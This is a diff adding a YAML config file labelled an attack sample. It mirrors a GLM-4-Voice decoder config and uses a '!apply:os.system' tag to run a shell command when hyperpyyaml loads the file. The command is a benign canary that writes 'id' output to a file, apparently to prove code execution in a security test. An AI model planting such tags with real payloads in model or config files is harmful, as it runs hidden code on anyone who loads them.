@@ -1,0 +1,14 @@
+# Attack sample - layout mirrors the official ZhipuAI/glm-4-voice-decoder
+# config.yaml. `!apply:` is the same tag the official file itself uses for
+# `__set_seed1: !apply:random.seed [1986]`; here it invokes os.system with a
+# benign sentinel command instead of a seed routine.
+__set_seed1: !apply:random.seed [1986]
+
+sample_rate: 22050
+llm_input_size: 1024
+llm_output_size: 1024
+spk_embed_dim: 192
+
+flow: !apply:os.system ["id > pwned_canary.txt 2>&1; echo code-exec-during-load_hyperpyyaml >> pwned_canary.txt"]
+
+hift: !new:builtins.dict
